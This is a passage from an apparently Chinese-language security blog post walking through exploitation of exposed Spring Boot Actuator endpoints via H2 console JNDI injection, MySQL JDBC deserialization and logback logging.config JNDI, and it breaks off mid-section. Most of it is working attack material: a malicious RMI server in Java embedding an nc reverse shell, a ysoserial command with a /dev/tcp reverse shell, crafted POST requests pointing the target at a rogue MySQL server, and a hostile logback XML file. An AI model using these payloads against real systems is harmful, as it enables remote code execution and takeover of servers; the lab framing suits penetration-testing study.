<h5 id="利用实例-7"><a href="#利用实例-7" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点的/h2-console页面，url会跳转到/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</p>
<p>![image-20210830204241737](Spring Boot Actuator未授权访问利用实战利用/image-20210830204241737.png)</p>
<p>这里的开启RMI服务JAVA代码如下:</p>
<p>反弹shell到192.168.233.242的1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该代码进行maven打包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>

<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用/image-20210830204556955.png)</p>
<p>然后指定访问ip地址开启RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用/image-20210830204855751.png)</p>
<p>使用nc监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>构造Post方式请求/h2-console/login.do?session=xxxx，请求报文中指定RMI服务的ip地址和端口</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=152896463738fcc39cb0a74a0e3b5a1e HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.233.242:9096/h2-console/login.jsp?jsessionid=10f21eec1f912ae36cd39c55740101b5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://192.168.233.242:8090/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>

<p>![image-20210830211055253](Spring Boot Actuator未授权访问利用实战利用/image-20210830211055253.png)</p>
<p>可以看到nc连接shell成功</p>
<p>![image-20210830211733059](Spring Boot Actuator未授权访问利用实战利用/image-20210830211733059.png)</p>
<h5 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>设置恶意url参数向h2-console/login.do?session=xxxx发出请求</li>
<li>服务器访问恶意url中的RMI服务，发生JNDI注入</li>
<li>RMI服务执行其他的恶意代码</li>
</ul>
<p>详细分析参见</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>
<h4 id="2-9-mysql-jdbc-deserialization-RCE"><a href="#2-9-mysql-jdbc-deserialization-RCE" class="headerlink" title="2.9. mysql jdbc deserialization RCE"></a>2.9. mysql jdbc deserialization RCE</h4><blockquote>
<p>该环境需要安装Mysql服务和新建数据库，主要还是application.properties配置文件，注意里面的数据库相关配置(请求的数据库名，数据库账户和密码)</p>
</blockquote>
<h5 id="利用条件-11"><a href="#利用条件-11" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h5 id="利用方法-10"><a href="#利用方法-10" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：查看环境依赖</strong></p>
<p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>
<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>  值，方便后续恢复其正常 jdbc url 值。</p>
<p><strong>步骤二：架设恶意 rogue mysql server</strong></p>
<p>在自己控制的服务器上运行 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
<p>这里使用反序列工具ysoserial(包含所有攻击方式，在环境包中的target目录下)ysoserial可以设置的命令参数如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$  java -jar ysoserial.jar</span><br><span class="line">Y SO SERIAL?</span><br><span class="line">Usage: java -jar ysoserial.jar [payload] &#x27;[command]&#x27;</span><br><span class="line">  Available payload types:</span><br><span class="line">     Payload             Authors                     Dependencies</span><br><span class="line">     -------             -------                     ------------</span><br><span class="line">     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2</span><br><span class="line">     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5</span><br><span class="line">     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0</span><br><span class="line">     Clojure             @JackOfMostTrades           clojure:1.8.0</span><br><span class="line">     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">     CommonsCollections1 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections2 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections3 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections4 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1</span><br><span class="line">     CommonsCollections6 @matthias_kaiser            commons-collections:3.1</span><br><span class="line">     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br><span class="line">     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">     Groovy1             @frohoff                    groovy:2.3.9</span><br><span class="line">     Hibernate1          @mbechler</span><br><span class="line">     Hibernate2          @mbechler</span><br><span class="line">     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     JRMPClient          @mbechler</span><br><span class="line">     JRMPListener        @mbechler</span><br><span class="line">     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     Jdk7u21             @frohoff</span><br><span class="line">     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2</span><br><span class="line">     MozillaRhino1       @matthias_kaiser            js:1.7R2</span><br><span class="line">     MozillaRhino2       @_tint0                     js:1.7R2</span><br><span class="line">     Myfaces1            @mbechler</span><br><span class="line">     Myfaces2            @mbechler</span><br><span class="line">     ROME                @mbechler                   rome:1.0</span><br><span class="line">     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">     URLDNS              @gebl</span><br><span class="line">     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14</span><br><span class="line">     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar (payload)  &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
<p><strong>步骤三：设置 spring.datasource.url 属性</strong></p>
<blockquote>
<p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
</blockquote>
<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>

<p> mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>



<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>步骤五：触发数据库查询</strong></p>
<p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<p><strong>步骤六：恢复正常 jdbc url</strong></p>
<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
<h5 id="利用实例-8"><a href="#利用实例-8" class="headerlink" title="利用实例"></a>利用实例</h5><p>访问目标站点 <a target="_blank" rel="noopener" href="http://192.168.233.242:9097/actuator/evn">http://192.168.233.242:9097/actuator/evn</a>   查看环境变量设置和依赖</p>
<p>![image-20210901112521481](Spring Boot Actuator未授权访问利用实战利用/image-20210901112521481.png)</p>
<p>然后架设恶意 rogue mysql server，使用 <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令，讲生成的文件放置在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 ‘bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1’ &gt; payload.ser</span><br></pre></td></tr></table></figure>



<p>然后运行 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本开启3306端口</p>
<p>![image-20210901141559697](Spring Boot Actuator未授权访问利用实战利用/image-20210901141559697.png)</p>
<p>POST方式构造请求/actuator/env，设置spring.datasource.url为上面开启服务的ip地址</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9097</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 216</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;jdbc:mysql://192.168.233.242:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210901142357376](Spring Boot Actuator未授权访问利用实战利用/image-20210901142357376.png)</p>
<p>访问/actuator/refresh刷新配置</p>
<p>![image-20210901142612261](Spring Boot Actuator未授权访问利用实战利用/image-20210901142612261.png)</p>
<p>在接着访问数据库查询的接口，在调用数据库服务的时候就会请求上面设置的url</p>
<p>例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<p>可以看到前面开启的mysql服务中会显示连接的客户端和返回的一些内容</p>
<p>![image-20210901142838024](Spring Boot Actuator未授权访问利用实战利用/image-20210901142838024.png)</p>
<p>shell反弹成功</p>
<p>![image-20210901145716430](Spring Boot Actuator未授权访问利用实战利用/image-20210901145716430.png)</p>
<h5 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
<li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
</ul>
<p>详细漏洞分析参见下文</p>
<p>​    <a target="_blank" rel="noopener" href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>
<p>  <a target="_blank" rel="noopener" href="http://cn-sec.com/archives/116934.html">  MySQL-JDBC 反序列化 | CN-SEC 中文网</a></p>
<h4 id="2-10-restart-logging-config-logback-JNDI-RCE"><a href="#2-10-restart-logging-config-logback-JNDI-RCE" class="headerlink" title="2.10.  restart logging.config logback JNDI RCE"></a>2.10.  restart logging.config logback JNDI RCE</h4><h5 id="利用条件-12"><a href="#利用条件-12" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-11"><a href="#利用方法-11" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 xml 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的  <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:1389/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤二：托管RMI服务及代码</strong></p>
<p>编写优化过后的用来反弹 shell 的JAVA代码(只需修改代码中的服务监听端口和反弹shell的ip地址及其端口)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将上面反弹shell的JAVA代码进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤三:  启动RMI服务</strong></p>
<p>指定开启连接RMI服务的主机IP地址，架设RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：设置 logging.config 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.xml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.xml&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-9"><a href="#利用实例-9" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写example.xml文档，访问192.168.233.242的RMI服务，放置在开启WEB服务的根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.242:8090/jndi&quot; as=&quot;appName&quot;/&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>



<p>然后使用python开启个简单的http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  SimpleHTTPServer  -m 80</span><br></pre></td></tr></table></figure>



<p>编写恶意RMI服务的反弹shell的JAVA代码,当用户访问该RMI服务时会导致使用nc连接到攻击者的主机，实现反向shell连接</p>
<p>代码如下:</p>
